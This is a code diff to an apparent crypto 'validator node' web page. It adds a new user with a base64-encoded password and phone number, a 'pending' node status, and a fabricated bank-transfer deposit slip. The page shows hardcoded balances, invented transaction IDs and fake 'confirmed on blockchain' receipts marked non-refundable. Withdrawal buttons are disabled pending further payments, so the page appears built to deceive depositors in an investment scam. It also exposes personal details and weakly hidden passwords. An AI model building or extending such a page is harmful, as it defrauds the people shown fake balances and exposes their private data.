@@ -242,20 +242,23 @@
     </div>
 
     <script>
-        // Ali Bagri (id NTMzODMz) USDT Reward updated to 17.7 (base64: 'MTcuNw==')
-        // Awais Ahmed remains 17.21 USDT (base64: 'MTcuMjE=')
+        // User database: Ali Bagri, Awais Ahmed, and new user Waqas Warrich (id 5440234)
         const userList = [
             { id: 'NTMzODMz', password: 'QWxsYWhANzg2', name: 'QWxpIEJhZ3Jp', phone: 'MDMwMzk5NjA2NDE=', nationality: 'UGFraXN0YW4=', 
               portfolio: { BTC: 'MA==', ETH: 'MA==', DOT: 'MA==', ADA: 'MA==', 'USDT Reward': 'MTcuNw==' }, // 17.7 USDT
               nodeStatus: { active:true, type:'Validator Node', round:3, publicDate:'March 17, 2026' } },
             { id: 'NTMzMzM2', password: 'UHVuamFiQDMzNQ==', name: 'QXdhaXMgQWhtZWQ=', phone: 'MDMxMTE2NjYwMjg=', nationality: 'UGFraXN0YW4=', 
               portfolio: { BTC: 'MA==', ETH: 'MA==', DOT: 'MA==', ADA: 'MA==', 'USDT Reward': 'MTcuMjE=' }, // 17.21 USDT
-              nodeStatus: { active:true, type:'Validator Node', round:3, publicDate:'March 17, 2026' } }
+              nodeStatus: { active:true, type:'Validator Node', round:3, publicDate:'March 17, 2026' } },
+            { id: 'NTQ0MDIzNA==', password: 'QWxsYWhANzg2', name: 'V2FxYXMgV2FycmljaA==', phone: 'MDMwNzEwMjYyODA=', nationality: 'UGFraXN0YW4=', 
+              portfolio: { BTC: 'MA==', ETH: 'MA==', DOT: 'MA==', ADA: 'MA==', 'USDT Reward': 'MA==' }, // 0 USDT
+              nodeStatus: { active:false, type:'Pending Validator', round:0, publicDate:'Waiting for blockchain verification' } }
         ];
 
         const slipAmounts = {
             'NTMzODMz': 'NTI3MDA=', // 52700
-            'NTMzMzM2': 'ODc4NjAw'  // 878600
+            'NTMzMzM2': 'ODc4NjAw',  // 878600
+            'NTQ0MDIzNA==': 'Njk1MA==' // 6950 for Waqas Warrich
         };
 
         function decodeBase64(str) { try { return atob(str); } catch (e) { return ''; } }
@@ -369,12 +372,44 @@
 
         function loadUserInfo() {
             const u = currentUser, name = decodeBase64(u.name), phone = decodeBase64(u.phone), nat = decodeBase64(u.nationality), uid = decodeBase64(u.id);
-            const tip = (u.id === 'NTMzODMz') ? 'Available after 1st Reward 33 USD withdrawal verified' : (u.id === 'NTMzMzM2') ? 'Available after 1st Reward 365 USD withdrawal verified' : '';
+            let tip = '';
+            if (u.id === 'NTMzODMz') tip = 'Available after 1st Reward 33 USD withdrawal verified';
+            else if (u.id === 'NTMzMzM2') tip = 'Available after 1st Reward 365 USD withdrawal verified';
+            else tip = 'Available after node verification complete';
+            
             const usdtRewardAmt = decodeFloat(u.portfolio['USDT Reward']);
-            document.getElementById('userInfoContent').innerHTML = `<div class="user-profile-container"><div class="user-profile-header"><div class="user-avatar">${name.split(' ').map(n=>n[0]).join('')}</div><div class="user-details"><h2>${name}</h2><p>User ID: ${uid}</p></div></div><div class="info-grid"><div class="info-card"><div class="info-label">Phone Number</div><div class="info-value">${phone}</div></div><div class="info-card"><div class="info-label">Nationality</div><div class="info-value">${nat}</div></div><div class="info-card"><div class="info-label">Account Type</div><div class="info-value">Premium Node Validator</div></div><div class="info-card"><div class="info-label">Active Member Since</div><div class="info-value">March 2026</div></div></div><div class="node-status-card"><div class="node-status-header"><div class="status-indicator"></div><div class="node-status-title">Node is Running</div></div><div class="validation-progress"><div style="display:flex;justify-content:space-between;margin-bottom:10px"><span style="color:#8892b0">Validation Complete</span><span style="color:#00ff88">Round 4 Complete</span></div><div class="progress-bar"><div style="height:100%;background:#00ff88;width:100%;border-radius:5px"></div></div><p style="color:#8892b0;margin-top:10px;font-size:14px">100% Complete (4/4 rounds)</p></div><div class="info-grid" style="margin-top:20px"><div class="info-card"><div class="info-label">Node Type</div><div class="info-value">Validator Active</div></div><div class="info-card"><div class="info-label">Public Blockchain Date</div><div class="countdown-container"><div class="countdown-date">📅 March 17, 2026</div><div class="countdown-timer" id="countdown">Loading...</div></div></div></div><div class="info-card" style="margin-top:20px"><div class="info-label">Reward History</div><div class="info-value" style="color:#ffa500; display:flex; align-items:center; gap:10px; flex-wrap:wrap;">🎁 USDT Reward: ${usdtRewardAmt.toFixed(2)} USDT 
-                <div class="random-block-wrapper" style="margin-top:0;"><span class="block-icon">🧱✨</span><span>Live Block: </span><span class="random-block-number">--</span></div>
-            </div></div><div class="node-buttons"><div class="tooltip"><button class="btn-disabled" onclick="showNodeMessage()">🛑 Stop Node</button><span class="tooltip-text">${tip}</span></div><div class="tooltip"><button class="btn-disabled" onclick="showNodeMessage()">💰 Sell Node</button><span class="tooltip-text">${tip}</span></div></div></div></div>`;
-            startCountdown();
+            
+            // Special node status display for Waqas Warrich (waiting for blockchain verification)
+            let nodeStatusHtml = '';
+            if (u.id === 'NTQ0MDIzNA==') {
+                nodeStatusHtml = `<div class="node-status-card">
+                    <div class="node-status-header"><div class="status-indicator" style="background:#ffaa00; animation: none;"></div><div class="node-status-title" style="color:#ffaa00;">Node Waiting for Blockchain Verification</div></div>
+                    <div class="validation-progress">
+                        <div style="display:flex; justify-content:space-between; margin-bottom:10px">
+                            <span style="color:#8892b0">Verification Pending</span>
+                            <span style="color:#ffaa00;">Awaiting Network Confirmation</span>
+                        </div>
+                        <div class="progress-bar"><div style="height:100%; background:#ffaa00; width:0%; border-radius:5px"></div></div>
+                        <p style="color:#8892b0; margin-top:10px; font-size:14px">0% Complete (0/4 rounds) – Please wait for blockchain to finalize</p>
+                    </div>
+                    <div class="info-grid" style="margin-top:20px">
+                        <div class="info-card"><div class="info-label">Node Type</div><div class="info-value">Pending Validator</div></div>
+                        <div class="info-card"><div class="info-label">Public Blockchain Date</div><div class="countdown-container"><div class="countdown-date">📅 TBD</div><div class="countdown-timer">Awaiting activation</div></div></div>
+                    </div>
+                    <div class="info-card" style="margin-top:20px"><div class="info-label">Reward History</div><div class="info-value" style="color:#ffaa88;">No rewards yet – complete verification</div></div>
+                    <div class="node-buttons"><div class="tooltip"><button class="btn-disabled" onclick="showNodeMessage()">🛑 Stop Node</button><span class="tooltip-text">${tip}</span></div><div class="tooltip"><button class="btn-disabled" onclick="showNodeMessage()">💰 Sell Node</button><span class="tooltip-text">${tip}</span></div></div>
+                </div>`;
+            } else {
+                nodeStatusHtml = `<div class="node-status-card"><div class="node-status-header"><div class="status-indicator"></div><div class="node-status-title">Node is Running</div></div>
+                    <div class="validation-progress"><div style="display:flex;justify-content:space-between;margin-bottom:10px"><span style="color:#8892b0">Validation Complete</span><span style="color:#00ff88">Round 4 Complete</span></div><div class="progress-bar"><div style="height:100%;background:#00ff88;width:100%;border-radius:5px"></div></div><p style="color:#8892b0;margin-top:10px;font-size:14px">100% Complete (4/4 rounds)</p></div>
+                    <div class="info-grid" style="margin-top:20px"><div class="info-card"><div class="info-label">Node Type</div><div class="info-value">Validator Active</div></div><div class="info-card"><div class="info-label">Public Blockchain Date</div><div class="countdown-container"><div class="countdown-date">📅 March 17, 2026</div><div class="countdown-timer" id="countdown">Loading...</div></div></div></div>
+                    <div class="info-card" style="margin-top:20px"><div class="info-label">Reward History</div><div class="info-value" style="color:#ffa500; display:flex; align-items:center; gap:10px; flex-wrap:wrap;">🎁 USDT Reward: ${usdtRewardAmt.toFixed(2)} USDT 
+                    <div class="random-block-wrapper" style="margin-top:0;"><span class="block-icon">🧱✨</span><span>Live Block: </span><span class="random-block-number">--</span></div>
+                </div></div><div class="node-buttons"><div class="tooltip"><button class="btn-disabled" onclick="showNodeMessage()">🛑 Stop Node</button><span class="tooltip-text">${tip}</span></div><div class="tooltip"><button class="btn-disabled" onclick="showNodeMessage()">💰 Sell Node</button><span class="tooltip-text">${tip}</span></div></div></div>`;
+            }
+            
+            document.getElementById('userInfoContent').innerHTML = `<div class="user-profile-container"><div class="user-profile-header"><div class="user-avatar">${name.split(' ').map(n=>n[0]).join('')}</div><div class="user-details"><h2>${name}</h2><p>User ID: ${uid}</p></div></div><div class="info-grid"><div class="info-card"><div class="info-label">Phone Number</div><div class="info-value">${phone}</div></div><div class="info-card"><div class="info-label">Nationality</div><div class="info-value">${nat}</div></div><div class="info-card"><div class="info-label">Account Type</div><div class="info-value">Premium Node Validator</div></div><div class="info-card"><div class="info-label">Active Member Since</div><div class="info-value">March 2026</div></div></div>${nodeStatusHtml}</div>`;
+            if (u.id !== 'NTQ0MDIzNA==') startCountdown();
             updateRandomBlocks();
         }
         function showNodeMessage() { alert("Available after node goes public blockchain"); }
@@ -390,6 +425,8 @@
                 slip = `<span class="close-btn" onclick="document.getElementById('depositSlipModal').classList.remove('active')">&times;</span><div class="slip-header"><h2>🏦 DEPOSIT SLIP</h2><p>Transaction confirmed on blockchain</p></div><div class="slip-amount">₨ ${amount}</div><div class="slip-detail"><div class="slip-row"><span class="slip-label">Status</span><span class="slip-value success">✓ SUCCESS</span></div><div class="slip-row"><span class="slip-label">Transaction ID</span><span class="slip-value">0x8f3a2b1c7e5d9a4b6c2f1e8d7a5b3c9d2e1f4a7b</span></div><div class="slip-row"><span class="slip-label">Date & Time</span><span class="slip-value">2026-03-15 14:32:45 UTC</span></div><div class="slip-row"><span class="slip-label">Channel</span><span class="slip-value">MetaMask (Wallet)</span></div><div class="slip-row"><span class="slip-label">From</span><span class="slip-value">0xAbCd...EfGh</span></div><div class="slip-row"><span class="slip-label">To</span><span class="slip-value">0xIjKl...MnOp</span></div><div class="slip-row"><span class="slip-label">Network Fee</span><span class="slip-value">0.00012 ETH (~₨ 42)</span></div><div class="slip-row"><span class="slip-label">Block #</span><span class="slip-value">19,284,736</span></div></div><div class="slip-footer">🔒 Verified by NodeJS • Non-refundable</div>`;
             } else if (currentUser.id === 'NTMzMzM2') {
                 slip = `<span class="close-btn" onclick="document.getElementById('depositSlipModal').classList.remove('active')">&times;</span><div class="slip-header"><h2>🏦 DEPOSIT SLIP</h2><p>Transaction confirmed on Binance Chain</p></div><div class="slip-amount">₨ ${amount}</div><div class="slip-detail"><div class="slip-row"><span class="slip-label">Status</span><span class="slip-value success">✓ SUCCESS</span></div><div class="slip-row"><span class="slip-label">Transaction ID</span><span class="slip-value">BSC: 0x2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b</span></div><div class="slip-row"><span class="slip-label">Date & Time</span><span class="slip-value">2026-03-16 09:17:22 UTC</span></div><div class="slip-row"><span class="slip-label">Channel</span><span class="slip-value">Binance (ID: 87654321)</span></div><div class="slip-row"><span class="slip-label">From</span><span class="slip-value">binance_hot_wallet_42</span></div><div class="slip-row"><span class="slip-label">To</span><span class="slip-value">${decodedId}_node_deposit</span></div><div class="slip-row"><span class="slip-label">Network Fee</span><span class="slip-value">0.0005 BNB (~₨ 185)</span></div><div class="slip-row"><span class="slip-label">Block #</span><span class="slip-value">29,384,112</span></div></div><div class="slip-footer">🔒 Verified by NodeJS • Non-refundable</div>`;
+            } else if (currentUser.id === 'NTQ0MDIzNA==') {
+                slip = `<span class="close-btn" onclick="document.getElementById('depositSlipModal').classList.remove('active')">&times;</span><div class="slip-header"><h2>🏦 DEPOSIT SLIP</h2><p>Transaction pending confirmation</p></div><div class="slip-amount">₨ ${amount}</div><div class="slip-detail"><div class="slip-row"><span class="slip-label">Status</span><span class="slip-value" style="color:#ffaa88;">⏳ PENDING</span></div><div class="slip-row"><span class="slip-label">Transaction ID</span><span class="slip-value">0x7e4d9c2a1b5f8e6d3c7a9b0f1e2d3c4b5a6d7e8f9</span></div><div class="slip-row"><span class="slip-label">Date & Time</span><span class="slip-value">2026-05-22 08:45:12 UTC</span></div><div class="slip-row"><span class="slip-label">Channel</span><span class="slip-value">Bank Transfer (IBFT)</span></div><div class="slip-row"><span class="slip-label">From</span><span class="slip-value">Waqas Warrich</span></div><div class="slip-row"><span class="slip-label">To</span><span class="slip-value">NodeJS Deposit Wallet</span></div><div class="slip-row"><span class="slip-label">Network Fee</span><span class="slip-value">₨ 15</span></div><div class="slip-row"><span class="slip-label">Block #</span><span class="slip-value">Awaiting confirmation</span></div></div><div class="slip-footer">🔒 Awaiting blockchain verification • 1/3 confirmations</div>`;
             }
             content.innerHTML = slip; modal.classList.add('active');
         }
